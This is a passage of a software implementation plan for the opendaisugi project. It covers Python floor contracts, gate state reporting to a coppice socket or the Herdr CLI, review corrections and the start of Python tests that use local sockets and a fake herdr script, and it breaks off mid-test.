# Floor contracts in Python, and the gate reports state — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development
> (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use
> checkbox (`- [ ]`) syntax for tracking.

**Goal:** Create the `opendaisugi.floor` package (PaneStateEvent, PaneBackend, and the value
types every later sub-project builds on) and make the call-time gate *report state*
(idle/working/blocked/done) after every verdict — to coppice-server when one is listening, to
Herdr when a Herdr pane is listening, to nobody otherwise — without ever letting a reporting
failure change a verdict, delay one past its budget, or raise.

**Architecture:** The floor's contracts (`opendaisugi/floor/`) are not part of the layer and may
depend on it; the layer (`gate.py`, `hook.py`, `gate_server.py`) may never import the floor. That
one-directional rule forces a small, deliberate duplication: the layer gets its own stdlib-only
event builder/validator/delivery module (`opendaisugi/_state_report.py`), and
`opendaisugi/floor/report.py` re-exports its `report_state()` for floor-side and extension
callers. `opendaisugi/floor/events.py` still owns the *canonical* §3.1 contract
(`PaneStateEvent`); a cross-check test pins the layer's independent, narrower validator (used
only by the one path — `daisugi hook report` via `gate.sock` — that a layer module must serve
without importing floor) to the same accept/reject verdicts as the dataclass, so the two cannot
silently drift apart.

**Tech Stack:** Python 3.12, stdlib only (`socket`, `subprocess`, `json`, `argparse`,
`dataclasses`) — no new hard dependency in the layer, per Global Constraints below.

**Spec:** `docs/plans/2026-09-08-workshop/spec-01-floor-contracts-and-herdr-hook.md` (binding
requirements); `docs/plans/2026-09-08-workshop/00-master-spec.md` §3.1–§3.2, §3.5–§3.6, §5.1
(the reasoning); `docs/plans/2026-08-27-cockpit-spec.md` (session tree, ask protocol, resident
gate — background for `gate.py`/`ask.py`/`session_tree.py`).

## Corrections from adversarial review (2026-09-08 — authoritative over the tasks below)

**Tasks 0 and 2 are ready to build now** — the environment check and the floor contracts are
sound: the `PaneStateEvent` dataclass, its per-rule tests, the layer/dataclass cross-check, the
`PaneBackend` value types, and the source-precedence table (`_PRECEDENCE` built from
`reversed(SOURCES)`) all match master §3.1/§3.2, the layer-purity indirection is correct in both
directions (`_state_report.py` imports no `floor`; `floor/report.py` re-exports it), and every
cited anchor in `gate.py`, `gate_server.py`, `install.py`, `config.py`, `modules.py`, and
`cli.py` exists verbatim at the cited place.

- **BLOCKER — Task 4 `record_lifecycle_event` mis-reads Claude Code's Notification payload, and
  its own test hides it.** `notification_type` is documented, not unverifiable
  (https://code.claude.com/docs/en/hooks — the Notification event's input carries `session_id`,
  `transcript_path`, `cwd`, `hook_event_name`, `message`, `title`, `notification_type`, and the
  matcher enumerates twelve values: `permission_prompt`, `idle_prompt`, `auth_success`,
  `elicitation_dialog`, `elicitation_url_dialog`, `elicitation_complete`, `elicitation_response`,
  `agent_needs_input`, `agent_completed`, `quota_auto_resume_fired`, `quota_auto_resume_stale`,
  `quota_auto_resume_disabled`). The plan's rule
  `is_permission = bool(payload.get("notification_type")) or "permission" in message.lower()`
  therefore reports `blocked` with a manufactured 90 s ask for *every* notification a real
  install sends, including `idle_prompt`, `agent_completed`, `auth_success` and the three
  `quota_auto_resume_*` — the exact "dressed up" state master §3.1/§3.6 forbids, and the thing
  that will fire a phone push under spec-06. `test_notification_with_explicit_type_is_blocked`
  asserts on `"permission_request"`, a value that does not exist; and
  `test_notification_idle_prompt_is_idle_not_blocked` omits `notification_type` entirely, so it
  passes on the broken path. Fix: classify by the enum —
  `_BLOCKING_NOTIFICATIONS = {"permission_prompt", "elicitation_dialog", "elicitation_url_dialog",
  "agent_needs_input"}`; blocked iff `notification_type in _BLOCKING_NOTIFICATIONS`, or (only when
  the field is absent) `"permission" in message.lower()`; every other value → `idle`. Rewrite the
  three tests to use real values, and add
  `test_notification_agent_completed_is_idle_not_blocked` and
  `test_notification_idle_prompt_with_its_real_type_is_idle`. Delete the "UNVERIFIED" paragraph
  from the docstring and cite the docs URL instead. — applied in Task 4 step 1 (all five tests)
  and step 3 (`_BLOCKING_NOTIFICATIONS`, the enum-based classification, and the rewritten
  docstring).

- **BLOCKER — Task 5 adds a stage to `detect_stages` and never adds its `swap.py` effect tag, so
  the suite goes red.** `tests/test_swap.py:56` asserts
  `set(STAGE_EFFECT) == {s.key for s in detect_stages(tmp_path)}` with the message "STAGE_EFFECT
  must cover every stage exactly", and `modules.render_wiring` calls `swap.effect_of(st.key)` for
  every stage. Adding `Stage("floor", …)` without touching `src/opendaisugi/swap.py:35` breaks
  `tests/test_swap.py`, so Task 5 Step 5's "whole suite green" is false, and master §3.5's
  `live | cfg | planned` stage tag is missing from the plan's honesty-tag coverage (the
  self-review claims it on `modules.py` alone). Fix: in the same task add `"floor": CFG,` to
  `STAGE_EFFECT` — `cfg`, not `live`, for the same reason §5.9 keeps gate mode `cfg`: the Stop and
  Notification hook entries live in `~/.claude/settings.json`, which the harness owns and reloads,
  not us. Add a test asserting `effect_of("floor") == "cfg"`. — applied in Task 5 step 1
  (`test_floor_report_effect_is_cfg` in `tests/test_swap.py`) and step 3 (`STAGE_EFFECT["floor"] = CFG`
  in `swap.py`, added in the same task as `modules.py`'s new `"floor"` `Stage`).

- **BLOCKER — Task 1's `hook_report_argv` writes the session tree to a different directory than
  its own tests read.** The implementation uses `args.root.parent / "sessions"` (correct — it
  mirrors `gate._log_tree`, `gate.py:588`, where `root` is `~/.opendaisugi/gate`), but
  `test_hook_report_downgrades_a_claimed_gate_source`,
  `test_hook_report_downgrades_a_claimed_operator_source` and
  `test_hook_report_stamps_the_pane_flag_onto_the_event` all pass `--root str(tmp_path)` and then
  read `SessionTree.open(tmp_path / "sessions", "s1")`. Those three tests fail as written, and the
  writes land in `tmp_path.parent` — pytest's shared per-run basetemp, which other tests read.
  (Task 4's `test_cli_hook_report_accepts_a_valid_event` and
  `test_hook_report_reachable_through_gate_sock` get this right: `--root <tmp>/gate` →
  `<tmp>/sessions`.) Fix: change all three Task 1 tests to pass `--root str(tmp_path / "gate")`.
  Do not "fix" the implementation instead — `root.parent / "sessions"` is the repo's convention.
  — applied in Task 1 step 2 (all six `hook_report_argv` calls in `tests/test_state_report.py`
  now use `--root str(tmp_path / "gate")`, not just the three that were failing outright, so none
  of them write outside their own `tmp_path`).

- **BLOCKER — Task 3's two "a report failure never changes the verdict" tests prove nothing, and
  the call sites they claim to protect are unwrapped.** Both
  `test_report_failure_never_changes_the_verdict` and
  `test_blocked_report_failure_still_posts_the_ask_and_waits` monkeypatch
  `opendaisugi._state_report.report_state`, which the plan already calls from *inside*
  `_report_and_append_state`'s own `try/except` — so both pass without ever reaching an escape
  path. Meanwhile `_maybe_report_state`'s preamble (`_safe_session_id(...)`,
  `_HARNESS_BY_FMT.get(fmt, fmt)`, `decision.clause`, `str(p.get("cwd") or "")`) and
  `_report_blocked`'s identical preamble sit outside every `try`, and neither call site is
  wrapped. An escape from `_maybe_report_state` lands in `gate_and_contract`'s
  `except Exception as exc:` at `gate.py:786-796`, which rewrites the *already final* verdict:
  in shadow mode a `would_deny=True` record becomes a fabricated "gate I/O error (shadow mode
  allows)" allow, and in enforce mode a computed allow flips to a deny. An escape from
  `_report_blocked` — which the plan places between `post_ask` and `wait_answer` — skips
  `wait_answer` entirely, so the operator gets a prompt that is never waited on and the deny
  stands with `ask=False`. That is exactly the property the second test is named for and exactly
  the property nothing enforces. Fix: (a) wrap both call sites,
  `try: _maybe_report_state(...) except Exception: pass` in `gate_and_contract` and
  `try: _report_blocked(...) except Exception: pass` in `_maybe_ask` (matching `_log_tree` and
  `_maybe_checkpoint`, whose whole bodies are already inside a `try`); (b) change both tests to
  `monkeypatch.setattr("opendaisugi.gate._report_and_append_state", _boom)` so they actually reach
  the escape path; (c) add `test_report_escape_cannot_flip_a_shadow_would_deny_to_allow` asserting
  `out.decision.would_deny is True` and no "gate I/O error" in `out.decision.reason` under
  `mode="shadow"`. — applied in Task 3 step 1 ((b) both existing tests now monkeypatch
  `opendaisugi.gate._report_and_append_state`; (c) `test_report_escape_cannot_flip_a_shadow_would_deny_to_allow`
  added) and step 3 ((a) `_maybe_ask` wraps its call to `_report_blocked`, `gate_and_contract`
  wraps its call to `_maybe_report_state`, and — beyond the letter of this fix — both
  `_report_blocked` and `_maybe_report_state` ALSO wrap their own preambles internally, matching
  `_log_tree`/`_maybe_checkpoint`'s whole-body pattern as a second line of defense).

- **BLOCKER — Task 1's 200 ms budget is per-operation, not total, and the budget test never
  exercises a timeout.** `test_budget_exceeded_returns_none_quickly` points `COPPICE_SOCK` at
  `tmp_path / "nothing-here.sock"`, so `connect()` fails immediately with `ENOENT`; the assertion
  `elapsed < 0.3` holds no matter what the timeouts are. In the implementation `s.settimeout(budget_s)`
  applies separately to `connect`, `sendall` and `recv`, so a wedged coppice-server costs up to
  `3 × budget_s` on the gate's blocking hot path, on every tool call — spec-01's crux says the
  report "never delays [a verdict] beyond a 200 ms budget". Fix: take one deadline —
  `deadline = time.monotonic() + budget_s` — and call
  `s.settimeout(max(0.001, deadline - time.monotonic()))` before each of connect/sendall/recv, and
  pass `timeout=max(0.001, deadline - time.monotonic())` to `subprocess.run` on the Herdr path.
  Replace the test with one that binds and listens on a real socket, accepts and never replies,
  and asserts `sink == "none"` with `elapsed < budget_s + 0.15`. — applied in Task 1 step 2
  (`test_budget_exceeded_returns_none_quickly` replaced with the real-listener version) and
  step 4 (one shared `deadline`/`_remaining()` reapplied before connect/sendall/recv; the Herdr
  path additionally moved from `subprocess.run(timeout=...)` to `Popen` + `wait(timeout=...)` +
  `kill()` with `stdout/stderr=DEVNULL`, closing the pipe-leak gap the NOTE below describes in
  the same edit rather than leaving it for later).

- **SHOULD-FIX — Task 2: master §3.1's deadline release ("then `working`") has no implementation
  and no named home.** `merge()` only *stops holding* after `ask.deadline`; the docstring defers
  the substitution to "a later spec's (02/03) job", so plan 02 (Go) and plan 03 (Python) will each
  invent it and drift. It cannot be deferred, because two paths produce a hold that is never
  released by a gate event: `gate_and_contract`'s `is_disarmed` early return (`gate.py:~617`)
  emits no report at all, and any crash of the gate process between `post_ask` and the resolving
  `working` report leaves the last event `blocked` forever. Fix: add
  `effective_state(current: PaneStateEvent | None, *, now: float) -> PaneStateEvent | None` to
  `floor/events.py` in Task 2 — returns `current` unchanged unless it is a `gate` `blocked` whose
  `ask.deadline < now`, in which case it returns `replace(current, state="working", ask=None,
  detail="ask deadline passed")` — and test it
  (`test_expired_gate_block_reads_as_working_with_no_fresh_event`). — applied in Task 2 step 1
  (the test, plus `effective_state` added to the `tests/floor/test_events.py` import line) and
  step 3 (`effective_state` implemented in `floor/events.py` and exported from `floor/__init__.py`).

- **SHOULD-FIX — Task 2 drops half of §3.1's `done` rule.** Master §3.1 and spec-01's `merge`
  docstring both say "`done` comes only from `process` or `headless`". The plan enforces only
  `manifest` ≠ `done`; a `gate`- or `operator`-sourced `done` is accepted by both validators and by
  `merge`, and would show a live agent as finished. Fix: reject `done` for any source outside
  `("process", "headless")` in `PaneStateEvent.__post_init__` and in
  `_validate_hook_report_row`, add the row to the cross-check parametrisation, and rename
  `test_manifest_cannot_say_done` → keep it plus `test_only_process_and_headless_may_say_done`.
  — applied in Task 2 step 1 (`test_manifest_cannot_say_done` kept, `test_only_process_and_headless_may_say_done`
  added, and four rows added to the cross-check `parametrize` table) and step 3 (both
  `PaneStateEvent.__post_init__` and `_validate_hook_report_row`, Task 1, now reject `done` for
  any source outside `("process", "headless")`).

- **SHOULD-FIX — Task 3: a `state` entry moves the session-tree head, which mis-parents the next
  tool call and the next checkpoint.** `session_tree._NO_MOVE` is
  `{"label", "head", "session"}`, so appending `"state"` makes it the head
  (`session_tree.py:232-240`, `_compute_head` at `:196-214`). Consequences: the next call's
  `tool_call` is parented to a state entry rather than to the previous verdict;
  `_maybe_checkpoint`'s `entry_id = tree.head() or "root"` (`gate.py:~664`) attaches the workspace
  snapshot to a state entry, so `tui_tree.py:39`'s `cps = {e.parent_id for e in … "checkpoint"}`
  marks a state node as the rewind point; and `tui_tree.nodes_for_sprig` renders a
  `state: verdict=allow` node between every pair of tool calls. Fix: add `"state"` to `_NO_MOVE`
  in the same edit that adds it to `ENTRY_TYPES`, add it to `nodes_for_sprig`'s skip tuple at
  `tui_tree.py:41`, and add `test_state_entries_do_not_move_the_head`. — applied in Task 3 step 1
  (the test) and step 3 (`_NO_MOVE` gains `"state"` in the same edit as `ENTRY_TYPES`;
  `nodes_for_sprig`'s skip tuple in `tui_tree.py` gains `"state"`).

- **SHOULD-FIX — Task 3 doubles the session-tree I/O on the gate's blocking path.**
  `_report_and_append_state` calls `SessionTree.open_or_create(...).append(...)`, and `append`
  calls `head()` → `_compute_head`, which does `self.path.read_text()` on the whole file
  (`session_tree.py:196-214`) — a second full read-and-parse per gate call on top of `_log_tree`'s,
  and a third when an ask is posted. Fix: have `_log_tree` return the `SessionTree` it opened and
  pass it into `_maybe_report_state`, or append the state entry from inside `_log_tree` after the
  verdict entry; keep the delivery call where it is. — applied in Task 3 step 3, taking the first
  option: `_log_tree` now returns the `SessionTree` it opened (`None` on failure), and
  `gate_and_contract` passes it to `_maybe_report_state`'s new `tree` parameter, which
  `_report_and_append_state` reuses instead of a second `open_or_create` — the blocked report
  (`_report_blocked`, no open tree yet at that point in the pipeline) still opens its own, which
  is unavoidable, not doubling.

- **SHOULD-FIX — Task 3 does not implement the spec's ordering assertion.** spec-01 §Tests
  requires "gate allow/deny/ask each emit the right event *after* the tree write (assert file
  order)". `test_state_entries_land_in_the_session_tree` only asserts a state entry exists. Fix:
  assert `[e.type for e in tree.entries()][-3:] == ["tool_call", "verdict", "state"]`. — applied
  in Task 3 step 1 (the assertion added to `test_state_entries_land_in_the_session_tree`).

- **SHOULD-FIX — Task 3's advertised `ask.deadline` precedes the real end of the wait.**
  `deadline = time.time() + timeout_s` is computed before `post_ask` and before `_report_blocked`,
  while `wait_answer` starts its own `clock()` after both. The floor therefore releases the hold
  (and a lower-precedence `idle` gets through) while the operator's prompt is still live. Fix:
  compute `deadline` after `_report_blocked` returns, or pass the wait's remaining budget. —
  applied in Task 3 step 3, taking the second option: `deadline` itself stays computed once,
  before `post_ask` (unchanged, still what the ask FILE and the floor report use), but
  `wait_answer` is now called with `timeout_s=max(0.0, deadline - time.time())` — the remaining
  budget, measured right before the call, AFTER `_report_blocked`'s own cost has already
  elapsed — instead of the original full `timeout_s`, so the real wait ends at (not after) the
  deadline already advertised to the floor.

- **SHOULD-FIX — Task 4's `test_lifecycle_event_never_raises_on_garbage_stdin` writes into the
  developer's real home.** It omits `sessions_root`, so `record_lifecycle_event` falls back to
  `DEFAULT_CAPTURES_ROOT.parent / "sessions"` = `~/.opendaisugi/sessions` and creates
  `no-session.jsonl` there; it also calls the unmocked `report_state` against the real
  `os.environ`. Fix: pass `sessions_root=tmp_path / "sessions"` and monkeypatch `report_state`,
  here and in `test_cli_hook_record_event_stop` / `test_cli_hook_report_accepts_a_valid_event`.
  — applied in Task 4 step 1 (all three tests now pass `sessions_root=tmp_path / "sessions"` —
  or, for the two CLI tests, `--captures-root`/`--root` under `tmp_path` — and monkeypatch
  `opendaisugi._state_report.report_state`).

- **SHOULD-FIX — Task 5's `--report` validation uses the wrong exit code.** Global Constraints
  §Exit codes: "CLI: 0 success, 1 user error, 2 gate deny, 3 unreachable". A bad `--report` value
  is a user error. Fix: `raise typer.Exit(code=1)`. — applied in Task 5 step 3 (`install_cmd`'s
  `--report` validation now exits 1, with a comment citing the Global Constraint).

- **NOTE — Task 5's "appears 9 times" is wrong; the three-line signature tail occurs 10 times** in
  `install.py` (lines 188, 197, 236, 292, 703, 734, 854, 904, 1080, 1133 — the Protocol's
  `plan`/`apply` plus four runtimes × two). `replace_all` still does the right thing; only the
  count in the prose is wrong. `install()`'s own copy at line 1497 has four-space indent and is
  correctly edited separately. — applied in Task 5 step 3 (the preamble text now says "every
  occurrence — ten in total" and spells out which ten, instead of a specific wrong count).

- **NOTE — STE100.** `"Floor-report preference recorded: coppice ({cfg_path}) — harness/coppice
  isn't built yet, so nothing listens for it today."` carries an em-dash, a parenthetical and a
  contraction, all three barred by Global Constraints §Copy. Suggested:
  `"Floor report set to coppice. Saved in {cfg_path}. Nothing listens for it yet. The coppice
  server is not built."` — applied in Task 5 step 3 (the suggested copy used verbatim).

- **NOTE — the Herdr argv is still an unverified fact, not only the env var name.** Task 1's
  docstring flags `HERDR_PANE_ID` as unverified but `test_herdr_cli_receives_the_exact_argv`
  asserts `pane report-agent <pane> --source daisugi --agent <harness> --state <state>` as
  though confirmed, and Herdr is absent on this box (Task 0 Step 2). Say so in the same docstring
  paragraph, and re-run the whole probe — verb, flag names, and env var — before spec-06. —
  applied in Task 1 step 4 (`_state_report.py`'s module docstring now says the CLI invocation
  itself — verb, every flag name, the env var — is equally unverified, and names re-verifying the
  report-agent call specifically, not only the env var, before spec-06).

- **NOTE — `subprocess.run(timeout=…)` does not bound wall time when the child leaks its pipes.**
  On timeout `run` kills the child and calls `communicate()` again, which blocks until every
  inherited pipe closes; a `herdr` that forks a daemon can hold the gate open past the budget.
  Consider `Popen` + `kill()` + `wait(timeout=…)` with `stdout/stderr=DEVNULL`. — applied in
  Task 1 step 4, folded into the same edit as the BLOCKER above (the Herdr branch of
  `report_state` now uses `Popen` + `wait(timeout=_remaining())` + `kill()` with
  `stdout=DEVNULL, stderr=DEVNULL`, so a herdr that forks a daemon and leaks its pipes cannot
  hold the gate open past the budget).

- **NOTE — `modules.py`'s new floor detection reads the developer's real
  `~/.claude/settings.json`.** `_claude_hook_installed` is hard-coded to `Path.home()`
  (`modules.py:55-66`), so `test_floor_stage_reports_herdr_and_coppice_honestly` is
  host-dependent for the `herdr` and `none` modules. The test only asserts on `coppice`, so it
  passes today; keep it that way, or take `home` as a parameter. — NOT applied: kept as-is,
  matching the reviewer's first option. `_claude_hook_installed`'s hard-coded `Path.home()` is
  pre-existing in this same file (the "gate" stage's own `_claude_hook_installed("daisugi hook")`
  check has always worked this way); `test_floor_stage_reports_herdr_and_coppice_honestly`
  deliberately asserts only on `coppice`, which is genuinely host-independent (config.yaml under
  `tmp_path`), so the test is not silently host-dependent by accident.

Re-review 2026-09-08: 17 of 17 verified applied, the 18th being the documented NOT-applied `modules.py` real-home NOTE whose rationale checks out; open: S4's new quoted `"SessionTree | None"` annotations in `gate.py` trip ruff F821 (verified empirically; `SessionTree` is only imported function-locally and `gate.py`'s `if TYPE_CHECKING:` block holds only `argparse`), so Task 3 Step 5's ruff-clean claim is false until `from opendaisugi.session_tree import SessionTree` is added to that block. — applied in Task 3 step 3 (coordinator, 2026-09-08).

## Global Constraints

- **Layer purity.** No module under `src/opendaisugi/` that is part of the layer (list in
  `tests/test_layer_boundary.py`, plan 00) may import from `opendaisugi.floor`, `opendaisugi.voice`,
  or `opendaisugi.coppice`. The test imports every layer module with those packages hidden.
- **Python 3.12, stdlib for the layer.** New hard deps in the layer: none. New extras allowed:
  `[floor]` (nothing yet — the client uses stdlib sockets), `[voice]`, `[int8]`, `[router]`.
- **Go 1.26** for `harness/coppice` (amended 2026-09-08: go-libghostty declares go 1.26.0; sprig stays on 1.25); module `github.com/opendaisugi/coppice`; `go vet` and
  `go test ./...` clean. Zig 0.16 and CMake are *build-time* requirements for go-libghostty; the
  plan installs both into `~/.local` without sudo (`uv tool install cmake`; Zig tarball).
- **Pins.** go-libghostty at the newest tag on the day plan 02 starts, recorded in `go.mod`
  and in `harness/coppice/PINS.md` together with the ghostty commit that binding builds.
  Herdr's vendored commit `c5a21edfcbc2d5b46540ad91b7980aca31f5f1f3` (their 1.3.2) is the
  reference for patch notes, not a requirement; the binding chooses the commit it fetches.
- **Tests.** `uv run --no-sync pytest -q` green; `uv run --no-sync ruff check .` clean;
  Go: `go test ./...` from `harness/coppice`. Never bare `uv run` (uv.lock is git-ignored; it
  re-resolves and strips extras).
- **Commits.** Atomic, stating the why, persona *OpenDaisugi Contributors*, **no AI-authorship
  attribution lines** (project policy overrides any session-level instruction). Never push;
  the public repo folds monthly.
- **`/tmp` is RAM.** Scratch on real disk; worktrees beside the repo.
- **Copy.** STE100 register in every user-facing string: short sentences, plain words, active
  voice, no em-dashes, no parentheticals. Errors teach the next command.
- **Exit codes.** Hooks: exit 2 = deny. CLI: 0 success, 1 user error, 2 gate deny, 3 unreachable.
- **Privacy.** No telemetry. No third-party relay in any default path. Push goes through a
  self-hosted ntfy or not at all.

Task-specific notes: `harness/coppice` (Go) does not exist yet — nothing in this plan touches
it; the coppice socket is exercised only through a fake listener in tests. `daisugi hook report`
is exit-code 0/1 (a CLI subcommand), not the hook exit-2-denies convention above, which applies
to the PreToolUse verdict hooks only.

---

### Task 0: Confirm the test environment before touching code

**Files:** none (verification only).

**Interfaces:** none.

- [ ] **Step 1: Confirm the suite runs and is green before this plan's changes**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest -q`
Expected: the existing suite passes (thousands of tests; a handful of `skipped`/`xfail` from
optional extras and live-host checks is normal — no `FAILED` lines).

- [ ] **Step 2: Confirm Herdr is absent on this box (records the fact the discovery step in
  Task 1 will encode)**

Run: `command -v herdr; echo "exit: $?"`
Expected: `exit: 1` (not found). If this instead prints a path, STOP and re-read Task 1 Step 4
before writing `_state_report.py` — Task 1's docstring text below assumes Herdr is absent and
must be rewritten from a real `herdr pane create` probe if it is present.

No commit for this task — it only establishes the starting state.

---

### Task 1: `opendaisugi._state_report` — the layer's event builder, deliverer, and hook-report validator

**Files:**
- Create: `src/opendaisugi/_state_report.py`
- Create: `src/opendaisugi/floor/report.py` (the one floor file this task touches — a two-line
  re-export; the rest of the `floor` package is built in Task 2)
- Test: `tests/floor/test_report.py`
- Test: `tests/test_state_report.py`

**Interfaces:**
- Produces:
  `STATES: tuple[str, ...]`, `SOURCES: tuple[str, ...]` (module-level constants, duplicated —
  not imported — in `opendaisugi.floor.events`, Task 2);
  `HERDR_PANE_ENV_CANDIDATES: tuple[str, ...]` (the discovery fact);
  `build_event(*, session_id: str, harness: str, state: str, source: str = "gate", harness_session_id: str | None = None, pane: str | None = None, ask: dict | None = None, detail: str = "", ts: float | None = None, v: int = 1) -> str`;
  `report_state(ev_json: str, *, env: Mapping[str, str] = os.environ, budget_s: float = 0.2) -> str`
  (returns `"coppice" | "herdr" | "none"`);
  `HookReportOutcome(stdout: str, stderr: str, exit_code: int)` (frozen dataclass);
  `hook_report_argv(argv: list[str], raw: bytes) -> HookReportOutcome`.
  `opendaisugi.floor.report` re-exports `report_state` under the same name.

- [ ] **Step 1: Run the Herdr discovery probe and decide what the docstring says**

Run: `command -v herdr && echo present || echo absent`

On this box (confirmed in Task 0 Step 2) this prints `absent`. The module docstring written in
Step 3 below therefore records the env var name as **unverified**, with `HERDR_PANE_ID` as the
primary candidate (matching Herdr's own `*_ID` naming convention for other identifiers) and
`HERDR_PANE` kept as a documented fallback. If a future run of this task finds `present`, replace
that paragraph with the real result of `herdr pane create` (inspect the child process's
environment for the exported variable) before writing code that depends on the guess.

- [ ] **Step 2: Write the failing tests**

```python
# tests/floor/test_report.py
"""report_state (master spec §3.1's delivery side): coppice socket / herdr
CLI / no-op, and the Herdr pane-id discovery (spec-01 plan task 1)."""

from __future__ import annotations

import json
import socket
import threading
import time

from opendaisugi._state_report import HERDR_PANE_ENV_CANDIDATES
from opendaisugi.floor.report import report_state


def _ev(**over):
    base = {
        "v": 1,
        "ts": time.time(),
        "session_id": "s1",
        "harness": "claude-code",
        "state": "working",
        "source": "gate",
        "detail": "",
    }
    base.update(over)
    return json.dumps(base)


def test_herdr_pane_env_candidates_are_recorded_in_fallback_order():
    assert HERDR_PANE_ENV_CANDIDATES == ("HERDR_PANE_ID", "HERDR_PANE")


def test_discovery_fact_is_recorded_verified_or_honestly_flagged_unverified():
    import opendaisugi._state_report as mod

    doc = mod.__doc__ or ""
    assert "UNVERIFIED" in doc or "confirmed" in doc


def test_coppice_socket_receives_the_event(tmp_path):
    sock_path = tmp_path / "coppice.sock"
    received = []
    ready = threading.Event()

    def _serve():
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(str(sock_path))
        srv.listen(1)
        ready.set()
        conn, _ = srv.accept()
        line = conn.makefile("rb").readline()
        received.append(json.loads(line))
        conn.sendall(b'{"ok": true}\n')
        conn.close()
        srv.close()

    t = threading.Thread(target=_serve, daemon=True)
    t.start()
    assert ready.wait(2)
    sink = report_state(_ev(), env={"COPPICE_SOCK": str(sock_path), "COPPICE_PANE": "w1:p1"})
    t.join(2)
    assert sink == "coppice"
    assert received[0]["id"] == "r"
    assert received[0]["cmd"] == "pane.report_state"
    assert received[0]["pane"] == "w1:p1"
    assert received[0]["event"]["session_id"] == "s1"


def test_herdr_cli_receives_the_exact_argv(tmp_path):
    log = tmp_path / "argv.log"
    herdr_script = tmp_path / "herdr"
    herdr_script.write_text(f'#!/bin/sh\necho "$@" > {log}\n')
    herdr_script.chmod(0o755)
    sink = report_state(
        _ev(state="blocked"),
        env={
            "HERDR_PANE_ID": "w1:p1",
            "PATH": str(tmp_path),
        },
    )
    assert sink == "herdr"
    argv_line = log.read_text().strip()
    assert (
        argv_line == "pane report-agent w1:p1 --source daisugi --agent claude-code --state blocked"
    )


def test_herdr_pane_fallback_name_is_honored(tmp_path):
    log = tmp_path / "argv.log"
    herdr_script = tmp_path / "herdr"
    herdr_script.write_text(f'#!/bin/sh\necho "$@" > {log}\n')
    herdr_script.chmod(0o755)
    sink = report_state(_ev(), env={"HERDR_PANE": "w1:p9", "PATH": str(tmp_path)})
    assert sink == "herdr"
    assert "w1:p9" in log.read_text()


def test_coppice_wins_when_both_env_vars_present(tmp_path):
    sock_path = tmp_path / "coppice.sock"
    ready = threading.Event()

    def _serve():
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(str(sock_path))
        srv.listen(1)
        ready.set()
        conn, _ = srv.accept()
        conn.recv(65536)
        conn.sendall(b'{"ok": true}\n')
        conn.close()
        srv.close()

    t = threading.Thread(target=_serve, daemon=True)
    t.start()
    assert ready.wait(2)
    sink = report_state(
        _ev(),
        env={
            "COPPICE_SOCK": str(sock_path),
            "COPPICE_PANE": "w1:p1",
            "HERDR_PANE_ID": "w1:p9",
        },
    )
    t.join(2)
    assert sink == "coppice"


def test_no_sink_present_returns_none():
    assert report_state(_ev(), env={}) == "none"


def test_unknown_state_to_herdr_is_skipped(tmp_path):
    herdr_script = tmp_path / "herdr"
    herdr_script.write_text("#!/bin/sh\nexit 0\n")
    herdr_script.chmod(0o755)
    sink = report_state(_ev(state="unknown"), env={"HERDR_PANE_ID": "w1:p1", "PATH": str(tmp_path)})
    assert sink == "none"


def test_budget_exceeded_returns_none_quickly(tmp_path):
    """A real socket that ACCEPTS the connection and never replies — not a
    fast ENOENT — so this actually exercises recv()'s share of the total
    budget, not just a fast connection-refused path. budget_s is a TOTAL
    wall-clock budget (§ the crux): connect + sendall + recv together must
    never cost more than ~budget_s, not up to 3x it."""
    sock_path = tmp_path / "wedged.sock"
    ready = threading.Event()
    stop = threading.Event()

    def _serve():
        srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        srv.bind(str(sock_path))
        srv.listen(1)
        ready.set()
        conn, _ = srv.accept()
        stop.wait(5)  # accept the connection, then never reply, never close
        conn.close()
        srv.close()

    t = threading.Thread(target=_serve, daemon=True)
    t.start()
    assert ready.wait(2)
    budget_s = 0.1
    start = time.monotonic()
    sink = report_state(
        _ev(),
        env={
            "COPPICE_SOCK": str(sock_path),
            "COPPICE_PANE": "w1:p1",
        },
        budget_s=budget_s,
    )
    elapsed = time.monotonic() - start
    stop.set()
    t.join(2)
    assert sink == "none"
    assert elapsed < budget_s + 0.15
```

```python
# tests/test_state_report.py
"""Unit tests for opendaisugi._state_report's build/validate/hook-report
pieces that don't fit tests/floor/test_report.py's report_state focus.

hook_report_argv is tested here as a pure function; its two real entry
points (the `daisugi hook report` CLI command, and gate_server.py's
gate.sock dispatch for {"argv": ["hook", "report"], ...}) are wired and
tested in tests/test_hook_report_events.py (task 4) and
tests/test_gate_resident.py (task 4).
"""

from __future__ import annotations

import json
import time

from opendaisugi._state_report import build_event, hook_report_argv


def test_build_event_shape_matches_section_3_1():
    ev = json.loads(build_event(session_id="s1", harness="claude-code", state="working"))
    assert ev["v"] == 1 and ev["session_id"] == "s1" and ev["harness"] == "claude-code"
    assert ev["state"] == "working" and ev["source"] == "gate"
    assert "ts" in ev and "pane" in ev and "harness_session_id" in ev


def test_build_event_clips_an_overlong_detail():
    ev = json.loads(
        build_event(session_id="s1", harness="claude-code", state="idle", detail="x" * 500)
    )
    assert len(ev["detail"]) == 200


def _row(**over):
    base = {
        "v": 1,
        "ts": time.time(),
        "session_id": "s1",
        "harness": "pi",
        "state": "idle",
        "source": "headless",
    }
    base.update(over)
    return json.dumps(base).encode()


def test_hook_report_downgrades_a_claimed_gate_source(tmp_path):
    from opendaisugi.session_tree import SessionTree

    # --root is the GATE root (mirrors gate.py: root.parent / "sessions" is
    # where the tree lives), so tmp_path/"gate" here, not bare tmp_path —
    # bare tmp_path would write into tmp_path.parent (pytest's shared
    # per-run basetemp) instead of this test's own tmp_path.
    out = hook_report_argv(["--root", str(tmp_path / "gate")], _row(source="gate"))
    assert out.exit_code == 0
    t = SessionTree.open(tmp_path / "sessions", "s1")
    states = [e for e in t.entries() if e.type == "state"]
    assert states[-1].data["source"] == "headless"


def test_hook_report_downgrades_a_claimed_operator_source(tmp_path):
    from opendaisugi.session_tree import SessionTree

    out = hook_report_argv(["--root", str(tmp_path / "gate")], _row(source="operator"))
    assert out.exit_code == 0
    t = SessionTree.open(tmp_path / "sessions", "s1")
    states = [e for e in t.entries() if e.type == "state"]
    assert states[-1].data["source"] == "headless"


def test_hook_report_stamps_the_pane_flag_onto_the_event(tmp_path):
